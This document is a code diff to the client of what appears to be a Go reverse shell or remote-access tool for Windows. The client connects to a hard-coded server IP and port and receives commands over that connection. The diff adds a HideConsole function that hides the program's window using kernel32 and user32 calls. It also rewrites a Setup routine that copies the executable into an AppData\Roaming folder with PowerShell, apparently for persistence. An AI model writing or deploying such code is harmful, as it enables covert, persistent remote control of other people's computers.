@@ -21,6 +21,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"strings"
+	"syscall"
 )
 
 func DisplayError(err error) {
@@ -30,18 +31,19 @@ func DisplayError(err error) {
 
 }
 func main() {
+	HideConsole()
 
-	ServerIP := "192.168.0.202"
+	ServerIP := "192.168.0.201"
 	Port := "9090"
 	connection, err := handleConnection.ConnectWithServer(ServerIP, Port)
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer connection.Close()
-	fmt.Print("\033[H\033[2J")
+	fmt.Println("\033[H\033[2J")
 	fmt.Println("[+] Conneciton established with Server :", connection.RemoteAddr().String())
 
-	bootRun()
+	Setup()
 
 	reader := bufio.NewReader(connection)
 
@@ -139,33 +141,54 @@ func main() {
 	}
 }
 
-func bootRun() {
+func Setup() {
 	home, _ := os.UserHomeDir()
 	exe_name := filepath.Base(os.Args[0])
 	without_ext := exe_name[:len(exe_name)-len(filepath.Ext(exe_name))]
-	appdata := filepath.Join(home, "AppData\\Roaming", without_ext)
+	folder_path := filepath.Join(home, "AppData\\Roaming", without_ext)
 
-	c1 := os.Chdir(filepath.Join(home, "AppData\\Roaming"))
-	if c1 != nil {
-		panic(c1)
+	c0 := os.Chdir(filepath.Join(home, "AppData\\Roaming")) //cd appdata/Roaming
+	if c0 != nil {
+		panic(c0)
 	}
 
-	if _, err := os.Stat(filepath.Join(home, "AppData\\Roaming", without_ext)); os.IsNotExist(err) {
-
-		e := os.Mkdir(without_ext, 0755)
+	if _, err := os.Stat(folder_path); os.IsNotExist(err) {
+		e := os.Mkdir(without_ext, 0755) //mkdir jack
 		if e != nil {
 			panic(e)
 		}
+		goto ELSE
 	}
+	goto ELSE
 
-	c2 := exec.Command("powershell", "Copy-Item", "./"+os.Args[0]+",./open.vbs", "-Destination", appdata)
+ELSE:
+	c1 := os.Chdir(folder_path) //cd appdata/Roaming/jack
+	if c1 != nil {
+		panic(c1)
+	}
+	c2 := exec.Command("powershell", "Copy-Item", "\""+os.Args[0]+"\"", "-Destination", "\""+folder_path+"\"", "-Recurse")
 	if err := c2.Run(); err != nil {
 		fmt.Println("Error: ", err)
 	}
+	fmt.Println("powershell", "Copy-Item", "\""+os.Args[0]+"\"", "-Destination", "\""+folder_path+"\"", "-Recurse")
 
-	c3 := os.Chdir(filepath.Join(home, "AppData\\Roaming", without_ext))
-	if c3 != nil {
-		panic(c3)
+}
+
+func HideConsole() {
+	getConsoleWindow := syscall.NewLazyDLL("kernel32.dll").NewProc("GetConsoleWindow")
+	if getConsoleWindow.Find() != nil {
+		return
 	}
-	return
+
+	showWindow := syscall.NewLazyDLL("user32.dll").NewProc("ShowWindow")
+	if showWindow.Find() != nil {
+		return
+	}
+
+	hwnd, _, _ := getConsoleWindow.Call()
+	if hwnd == 0 {
+		return
+	}
+
+	showWindow.Call(hwnd, 0)
 }
